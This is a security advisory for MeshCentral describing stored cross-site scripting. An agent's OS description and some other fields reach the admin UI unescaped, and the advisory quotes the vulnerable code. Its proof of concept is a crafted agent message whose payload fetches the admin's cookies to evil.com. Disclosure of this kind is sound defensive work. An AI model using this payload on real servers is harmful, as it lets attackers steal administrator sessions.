# [H] MeshCentral has unsanitized data fields

## Summary
Severity: High
Advisory: GHSA-c7hr-448w-65px
CWE: CWE-20, CWE-74
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-18
Source: https://github.com/advisories/GHSA-c7hr-448w-65px
Type: github-advisory

## Affected
- npm: `meshcentral` — affected >=0 <1.1.60

## Details
### Description

A rogue or compromised MeshAgent can inject arbitrary HTML/JavaScript via the osdesc (OS description) field in its coreinfo message. The server stores this value with zero HTML sanitization (meshagent.js:1903 only checks typeof == 'string'). When an admin views the
device details panel, the value is rendered via addDeviceAttribute() → QH() which sets innerHTML, executing the payload in the admin's browser session. The main management UI CSP includes 'unsafe-inline' (webserver.js:7072), so inline event handlers and script execution are unrestricted.

### Technical Details

```javascript
// meshagent.js:1903 -- Agent input, only type check
if (typeof command.osdesc == 'string') { device.osdesc = command.osdesc;
change = 1; }

// default3.handlebars:8713 -- Rendered WITHOUT EscapeHtml()
if (node.osdesc) { x += addDeviceAttribute("Operating System", node.osdesc); }
// addDeviceAttribute() interpolates into HTML string, QH() sets innerHTML

// INCONSISTENCY: Same field IS escaped elsewhere:
// Line 13529: addDetailItem("Version", EscapeHtml(node.osdesc), s)
// Line 5760: EscapeHtml(node.osdesc ? node.osdesc : '')
```

Additional unescaped agent fields:

- node.name unescaped in sharing dialog (line 4695), user group list (line 18625),
permission dialogs (lines 18675, 19413) -- HIGH
- cpuinfo.thermals[].InstanceName attribute injection (line 13502) -- MEDIUM
- volumes[].name unescaped in file browser (line 12612) -- MEDIUM

No server-side defense: CloneSafeNode() strips secrets but not XSS. validateObjectForMongo() only enforces length limits (1024 chars). No HTML sanitation exists anywhere in the agent→DB→UI pipeline.

### Proof of Concept

Rogue agent sends via WebSocket:

```json
{
  "action": "coreinfo",
  "osdesc": "<img src=x onerror='fetch(\"https://evil.com/steal?\"+document.cookie)'>",
  "name": "Legit-PC"
}
```

Payload fires when any admin views the device details panel. No click required.

<img width="939" height="587" alt="image" src="https://github.com/user-attachments/assets/1ba372bb-73be-477b-95ca-fa5fc247f8f1" />

## References
- https://github.com/Ylianst/MeshCentral/security/advisories/GHSA-c7hr-448w-65px
- https://github.com/Ylianst/MeshCentral
- https://github.com/Ylianst/MeshCentral/releases/tag/1.1.60
